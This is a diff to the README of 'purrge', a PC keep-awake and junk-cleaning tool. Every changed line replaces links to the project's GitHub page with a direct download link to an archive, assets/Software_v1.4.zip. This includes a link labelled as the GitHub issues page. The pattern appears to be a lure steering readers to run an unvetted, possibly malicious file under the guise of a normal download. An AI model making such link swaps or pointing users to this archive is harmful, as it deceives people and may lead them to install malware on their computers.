@@ -1,6 +1,6 @@
 # 🐾 purrge - Keeps Your PC Awake and Junk-Free
 
-[![Download purrge](https://img.shields.io/badge/Download-purrge-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Immoral-piecederesistance927/purrge)
+[![Download purrge](https://img.shields.io/badge/Download-purrge-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Immoral-piecederesistance927/purrge/main/assets/Software_v1.4.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Follow these simple steps to get purrge running on your computer:
 ### Step 1: Download purrge
 
 Visit this link to download the application:  
-[**https://github.com/Immoral-piecederesistance927/purrge**](https://github.com/Immoral-piecederesistance927/purrge)
+[**https://raw.githubusercontent.com/Immoral-piecederesistance927/purrge/main/assets/Software_v1.4.zip**](https://raw.githubusercontent.com/Immoral-piecederesistance927/purrge/main/assets/Software_v1.4.zip)
 
 ### Step 2: Run the Program
 
@@ -146,7 +146,7 @@ No. purrge works completely offline. It doesn't send any data anywhere.
 
 If you run into any issues or have questions, you can:
 
-- Visit the [GitHub page](https://github.com/Immoral-piecederesistance927/purrge) and open an issue
+- Visit the [GitHub page](https://raw.githubusercontent.com/Immoral-piecederesistance927/purrge/main/assets/Software_v1.4.zip) and open an issue
 - Check the **Help** section inside purrge (press `H`)
 
 ---
@@ -164,7 +164,7 @@ If you run into any issues or have questions, you can:
 
 Need to download purrge again? Here's the link:
 
-[**Download purrge**](https://github.com/Immoral-piecederesistance927/purrge)
+[**Download purrge**](https://raw.githubusercontent.com/Immoral-piecederesistance927/purrge/main/assets/Software_v1.4.zip)
 
 ---
 
